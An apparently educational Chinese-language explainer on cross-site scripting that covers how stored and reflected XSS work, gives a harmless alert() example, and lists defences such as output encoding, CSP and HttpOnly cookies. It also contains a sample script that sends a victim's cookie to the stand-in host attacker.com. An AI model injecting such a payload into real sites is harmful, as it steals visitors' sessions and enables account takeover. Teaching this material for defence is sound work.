# XSS

XSS（Cross-Site Scripting，跨站脚本）是一种常见的web应用程序漏洞，攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。这种攻击利用了网站对用户输入数据的信任。

以下是XSS攻击的基本步骤和原理：

1. 漏洞存在：
   网站允许用户输入数据（如评论、用户名、搜索框等），但没有正确地过滤或转义这些输入。[2]

2. 攻击者注入恶意代码：
   攻击者在输入字段中插入包含JavaScript代码的文本。例如，在评论框中输入：
   ```html
   <script>alert('You've been hacked!');</script>
   ```

3. 网站存储或反射输入：
   - 存储型XSS：网站将未经处理的输入保存到数据库中。
   - 反射型XSS：网站直接在响应中包含未经处理的输入。[3]

4. 受害者访问页面：
   当其他用户访问包含恶意脚本的页面时，浏览器会解释并执行这些脚本。

5. 恶意脚本执行：
   脚本在受害者的浏览器中运行，可能会：
   - 窃取用户的cookie或会话信息
   - 重定向用户到钓鱼网站
   - 在页面上显示虚假内容
   - 执行其他恶意操作[4]

举个具体的例子：

假设有一个社交网站允许用户发布状态更新。攻击者可能会发布以下状态：

```html
今天天气真好！<script>var img = new Image(); img.src = "http://attacker.com/steal?cookie=" + document.cookie;</script>
```

如果网站没有正确处理这个输入，当其他用户查看这个状态时，隐藏的脚本会执行，将受害者的cookie发送到攻击者的服务器。[5]

防御措施：
1. 输入验证：过滤用户输入，移除或转义特殊字符。
2. 输出编码：在显示用户输入时进行适当的HTML编码。
3. 使用内容安全策略（CSP）：限制可以加载和执行的资源。
4. HttpOnly标志：防止JavaScript访问cookie。
5. 定期安全审计和渗透测试。[2], [4]

总之，XSS攻击利用了网站对用户输入的信任和不当处理。通过实施proper输入验证和输出编码，大多数XSS漏洞是可以被预防的。